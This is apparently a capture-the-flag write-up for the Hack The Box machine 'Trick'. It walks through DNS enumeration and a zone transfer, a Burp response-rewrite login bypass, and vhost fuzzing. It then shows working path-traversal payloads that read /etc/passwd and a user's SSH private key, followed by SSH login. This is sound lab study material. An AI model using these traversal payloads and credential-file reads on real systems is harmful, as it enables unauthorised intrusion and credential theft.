## Trick 🔮
`IP address: 10.10.11.166`

Enumeration is the key when you come to this box. It has also a lot of rabbit holes, which could be very "tricky" and you easily get lost.

### Discovering the service

The old boy, `nmap` scanned the whole TCP and UDP range and it found the following services:

```
TCP:

22/tcp open ssh syn-ack
25/tcp open smtp syn-ack
53/tcp open domain syn-ack
80/tcp open http syn-ack

UDP:

53/udp open domain udp-response ttl 63
```

Usually the webapps are the initial attack surface of the boxes and people can start the job on web applications, so did I. Found nothing, template app, no input fields or login page. Moving on to the SMTP service, but it was also a dead end. Something has to be vulnerably and my gut feelings said it is the DNS service, not the SSH.

Available Tools:
- dig
- nslookup
- host
- nmap

Here is a one-liner to collect the DNS related nmap scripts:

`ls /usr/share/nmap/scripts | grep dns | cut -d'.' -f 1 | tr '\n' ',' | sed 's/.$//'`

And the output:

`broadcast-dns-service-discovery,dns-blacklist,dns-brute,dns-cache-snoop,dns-check-zone,dns-client-subnet-scan,dns-fuzz,dns-ip6-arpa-scan,dns-nsec3-enum,dns-nsec-enum,dns-nsid,dns-random-srcport,dns-random-txid,dns-recursion,dns-service-discovery,dns-srv-enum,dns-update,dns-zeustracker,dns-zone-transfer,fcrdn`

So it can be used in the nmap scripts:

`nmap -vvvv script=broadcast-dns-service-discovery,dns-blacklist,dns-brute,dns-cache-snoop,dns-check-zone,dns-client-subnet-scan,dns-fuzz,dns-ip6-arpa-scan,dns-nsec3-enum,dns-nsec-enum,dns-nsid,dns-random-srcport,dns-random-txid,dns-recursion,dns-service-discovery,dns-srv-enum,dns-update,dns-zeustracker,dns-zone-transfer,fcrdn $IP_ADDRESS -p 53`

But no valuable information found in the output, so manual enum was performed successfully:

```
nslookup
> SERVER 10.10.11.166
Default server: 10.10.11.166
Address: 10.10.11.166#53
> 10.10.11.166
166.11.10.10.in-addr.arpa	name = trick.htb.
```

Okay, that's something. Let's add it to the `/etc/resolv.conf`:
`nameserver 10.10.11.166`

New DNS server was added to the resolve config, now we can query the DNS server. And one of the most juicy thing what a hacker can do is DNS zone transfer (AXFR). So I tried:

```
dig axfr @10.10.11.166 trick.htb

; <<>> DiG 9.18.1-1-Debian <<>> axfr @10.10.11.166 trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.		604800	IN	NS	trick.htb.
trick.htb.		604800	IN	A	127.0.0.1
trick.htb.		604800	IN	AAAA	::1
preprod-payroll.trick.htb. 604800 IN	CNAME	trick.htb.
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 44 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
;; WHEN: Mon Jul 04 11:37:22 EDT 2022
;; XFR size: 6 records (messages 1, bytes 231)
```
Fine, a new subdomain came out. After it was added to the `hosts` file and fired up in the browser (`http://preprod-payroll.trick.htb`) a new web application welcomed. It has a login page, therefore a dirbuster scan was run without luck. Before moving on I took a closer look at the login page and it was very interesting:

```javascript
<script>
	$('#login-form').submit(function(e){
		e.preventDefault()
		$('#login-form button[type="button"]').attr('disabled',true).html('Logging in...');
		if($(this).find('.alert-danger').length > 0 )
			$(this).find('.alert-danger').remove();
		$.ajax({
			url:'ajax.php?action=login',
			method:'POST',
			data:$(this).serialize(),
			error:err=>{
				console.log(err)
		$('#login-form button[type="button"]').removeAttr('disabled').html('Login');

			},
			success:function(resp){
				if(resp == 1){
					location.href ='index.php?page=home';
				}else if(resp == 2){
					location.href ='voting.php';
				}else{
					$('#login-form').prepend('<div class="alert alert-danger">Username or password is incorrect.</div>')
					$('#login-form button[type="button"]').removeAttr('disabled').html('Login');
				}
			}
		})
	})
</script>
```
What we needed here is just a big 1. If the response contained 1 (successful authentication) it navigated the browser to the home page.
Burp was launch immediately and I rewrote the authentication probe response to `1` and it almost worked. The application still knew our session was never authorized to access the page, so it kept sending HTTP 302. To get rid of this annoying thing I did the following:

1. Intercept traffic
2. Catch the response
3. Modify the number to 1.
4. Modify the next response too:
5. HTTP Response: 200 OK
6. Remove location header

Putting these steps into auto-replace rules worked like a charm, however it was pointless. I was able to access and use the restricted pages, but it was a rabit hole.

Let's try to find subdomains:

`dnsrecon -D subdomains.txt -d trick.htb -t brt`

`python3 dnscan.py -d trick.htb. -w subdomains.txt -q -v`

None of them worked and here comes the trick. Approching the enumeration with another technique, you can use HTTP requests to identify subdomains. Plus one more important thing. It is always worth to use the prefixes during the domain name enum. For exmaple:

- dev
- uat
- int
- stage
- preprod
- prod

Here I kept the `preprod-` prefix and chose the proper tool for this job:

`wfuzz -c -w subdomains-10000.txt -u http://10.10.11.166 -H 'Host: preprod-FUZZ.trick.htb' --hh 5480`

With the `-H` switch we can add HTTP header to the requests. The `FUZZ` keyword is the placeholder and wfuzz will replace this keyword with the actual word provided in the wordlist.

`--hh` - hide responses with the specified chars. 

The 5480 is the character number of the error page when we use unkown host. During the scanning process wfuzz is spanning the output, therefore it is recommended to filter these findings. So the output look liked this:

```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.166/
Total requests: 9985

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                    
=====================================================================

000000244:   200        178 L    631 W      9660 Ch     "marketing"                                                                                                                                                
000003734:   302        266 L    527 W      9546 Ch     "payroll"                                                                                                                                                  

Total time: 57.82799
Processed Requests: 9985
Filtered Requests: 9983
Requests/sec.: 172.6672
```

Another one! By adding `preprod-marketing.htb` to the `hosts` file it unlocked a new web application. Another one!
Navigating through the application, a suspicious attack surface could be noticed in the browser bar:

`http://preprod-marketing.trick.htb/index.php?page=about.html`


The `page` parameter might be a good surface. Since it is a PHP application, there is a little chance to LFI or RFI. Basic payloads did not work, we need something heavier here:

`dotdotpwn -m http-url -u http://preprod-marketing.trick.htb/index.php?page=TRAVERSAL -M GET -k root`

The method is pretty same as the previous one. Keyword subtitution and response comparison.

```
[*] Testing URL: http://preprod-marketing.trick.htb/index.php?page=..././..././..././etc/passwd <- VULNERABLE
[*] Testing URL: http://preprod-marketing.trick.htb/index.php?page=..././..././..././etc/issue
[*] Testing URL: http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././etc/passwd <- VULNERABLE
[*] Testing URL: http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././etc/issue
[*] Testing URL: http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././etc/passwd <- VULNERABLE
[*] Testing URL: http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././etc/issue
[*] Testing URL: http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././..././etc/passwd <- VULNERABLE
[*] Testing URL: http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././..././etc/issue
```

Keeping eye on the results the users could be retrieved and one user seemed to be interesting:

`michael:x:1001:1001::/home/michael:/bin/bash`

[Wait a minute](https://youtu.be/cw9FIeHbdB8?t=5)🧐, the host using SSH.

It's time to figure out whether _michael_ has SSH access to the box.

`http://preprod-marketing.trick.htb/index.php?page=..././..././..././home/michael/.ssh/id_rsa`

Aaand he has: 👍🏾

```
#### micheal's key
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
...
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

Dump the key into a file and SSH to the server:

`ssh -vvv michael@10.10.11.116 -i privkey`

We got User privilege on the box:

```
michael@trick:~$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
michael@trick:~$ uname -a
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64 GNU/Linux
michael@trick:~$ hostname
trick
```
